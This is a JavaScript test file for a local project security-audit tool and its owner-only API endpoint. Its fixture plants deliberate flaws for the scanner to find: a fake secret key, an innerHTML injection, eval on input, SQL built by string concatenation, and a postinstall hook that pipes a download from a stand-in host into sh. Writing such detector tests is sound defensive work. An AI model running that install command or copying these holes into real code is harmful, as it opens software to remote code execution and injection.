import test from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { auditProject } from '../src/project-audit.mjs';
import { startServer } from '../src/server.mjs';

function project() {
  const dir = mkdtempSync(path.join(tmpdir(), 'sohken-project-'));
  const secretValue = ['sk-', '12345678901234567890'].join('');
  mkdirSync(path.join(dir, 'node_modules', 'ignored'), { recursive: true });
  mkdirSync(path.join(dir, '.aws'), { recursive: true });
  mkdirSync(path.join(dir, '.sohken'), { recursive: true });
  writeFileSync(path.join(dir, 'app.js'), [
    `const secret = "${secretValue}";`,
    ['element.in', 'nerHTML = request.body;'].join(''),
    ['ev', 'al(input);'].join(''),
    ['const rows = db.query(', '`select * from users where id = ${id}`);'].join(''),
  ].join('\n'));
  writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ scripts: { postinstall: 'curl https://bad.invalid/x | sh' } }));
  writeFileSync(path.join(dir, 'node_modules', 'ignored', 'bad.js'), ['eval', '(input)'].join(''));
  writeFileSync(path.join(dir, '.aws', 'credentials.json'), JSON.stringify({ access_key: ['AKIA', '1234567890ABCDEF'].join('') }));
  writeFileSync(path.join(dir, '.sohken', 'config.json'), '{"secret":"private local key"}');
  return dir;
}

test('local project audit finds source risks and does not return source text', async t => {
  const dir = project(); t.after(() => rmSync(dir, { recursive: true, force: true }));
  const secretValue = ['sk-', '12345678901234567890'].join('');
  const report = await auditProject(dir);
  assert.equal(report.project, path.basename(dir));
  assert.ok(report.findings.some(item => item.rule === 'secret.token' && item.file === 'app.js' && item.line === 1));
  assert.ok(report.findings.some(item => item.rule === 'js.html-injection' && item.line === 2));
  assert.ok(report.findings.some(item => item.rule === 'js.dynamic-code' && item.line === 3));
  assert.ok(report.findings.some(item => item.rule === 'js.sql-concatenation' && item.line === 4));
  assert.ok(report.findings.some(item => item.rule === 'manifest.install-command'));
  assert.equal(report.filesScanned, 2);
  const serialized = JSON.stringify(report);
  assert.ok(!serialized.includes(secretValue));
  assert.ok(!serialized.includes('select * from users'));
  assert.ok(report.limitations.some(text => text.includes('not proof')));
});

test('local project audit rejects missing paths and files', async t => {
  const dir = project(); t.after(() => rmSync(dir, { recursive: true, force: true }));
  await assert.rejects(auditProject(''), /valid local project folder/);
  await assert.rejects(auditProject(path.join(dir, 'app.js')), /real folder/);
});

test('online dependency audit sends only exact npm package versions and maps OSV advisories', async t => {
  const dir = project(); t.after(() => rmSync(dir, { recursive: true, force: true }));
  writeFileSync(path.join(dir, 'package-lock.json'), JSON.stringify({ lockfileVersion: 3, packages: {
    '': { name: 'fixture' }, 'node_modules/lodash': { version: '4.17.20' },
    'node_modules/@scope/lib': { version: '1.2.3' },
  } }));
  let sent;
  const fetchImpl = async (url, options) => {
    assert.equal(url, 'https://api.osv.dev/v1/querybatch');
    sent = JSON.parse(options.body);
    return { ok: true, json: async () => ({ results: [{ vulns: [{ id: 'GHSA-1234-5678-90ab' }] }, { vulns: [] }] }) };
  };
  const report = await auditProject(dir, { onlineDependencies: true, fetchImpl });
  assert.equal(report.onlineCheck, 'complete');
  assert.equal(report.dependencies.versionsFound, 2);
  assert.deepEqual(sent.queries, [
    { package: { name: 'lodash', ecosystem: 'npm' }, version: '4.17.20' },
    { package: { name: '@scope/lib', ecosystem: 'npm' }, version: '1.2.3' },
  ]);
  const advisory = report.findings.find(item => item.rule === 'dependency.osv');
  assert.equal(advisory.package, 'lodash');
  assert.equal(advisory.advisory, 'GHSA-1234-5678-90ab');
  assert.ok(!JSON.stringify(sent).includes(['sk-', '12345678901234567890'].join('')));
});

test('online dependency audit reports provider failure without claiming a clean result', async t => {
  const dir = project(); t.after(() => rmSync(dir, { recursive: true, force: true }));
  writeFileSync(path.join(dir, 'package-lock.json'), JSON.stringify({ packages: { '': {}, 'node_modules/demo': { version: '1.0.0' } } }));
  await assert.rejects(auditProject(dir, { onlineDependencies: true, fetchImpl: async () => { throw new Error('offline'); } }), /No dependency advisory result is available/);
});

test('project audit endpoint is owner-only and stores no code', async t => {
  const dataDir = mkdtempSync(path.join(tmpdir(), 'sohken-project-api-'));
  const dir = project();
  const server = await startServer({ dataDir, port: 0 });
  t.after(async () => { await server.close(); rmSync(dir, { recursive: true, force: true }); rmSync(dataDir, { recursive: true, force: true }); });
  const call = (token, body) => fetch(`${server.url}/api/project-audit`, { method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify(body) });
  assert.equal((await call(server.agentToken, { path: dir })).status, 403);
  const response = await call(server.ownerToken, { path: dir });
  assert.equal(response.status, 200);
  const report = await response.json();
  assert.ok(report.findings.length > 0);
  assert.ok(!JSON.stringify(server.engine.export()).includes('select * from users'));
  assert.ok(server.engine.verify().valid);
});

test('hosted server refuses local project inspection', async t => {
  const dataDir = mkdtempSync(path.join(tmpdir(), 'sohken-project-remote-'));
  const previous = Object.fromEntries(['SOHKEN_ALLOW_REMOTE', 'SOHKEN_PUBLIC_ORIGIN', 'SOHKEN_SECURE_COOKIES'].map(key => [key, process.env[key]]));
  process.env.SOHKEN_ALLOW_REMOTE = 'true'; process.env.SOHKEN_PUBLIC_ORIGIN = 'https://sohken.test'; process.env.SOHKEN_SECURE_COOKIES = 'true';
  let server;
  try { server = await startServer({ dataDir, port: 0, host: '127.0.0.1' }); }
  finally { for (const [key, value] of Object.entries(previous)) value === undefined ? delete process.env[key] : process.env[key] = value; }
  t.after(async () => { await server.close(); rmSync(dataDir, { recursive: true, force: true }); });
  const response = await new Promise((resolve, reject) => {
    const req = http.request({ host: '127.0.0.1', port: server.server.address().port, path: '/api/project-audit', method: 'POST', headers: { Host: 'sohken.test', Authorization: `Bearer ${server.ownerToken}`, 'Content-Type': 'application/json' } }, res => { let body = ''; res.setEncoding('utf8'); res.on('data', chunk => body += chunk); res.on('end', () => resolve({ status: res.statusCode, body })); });
    req.on('error', reject); req.end(JSON.stringify({ path: 'C:\\' }));
  });
  assert.equal(response.status, 403);
  assert.match(response.body, /only in the local Sohken app/);
});
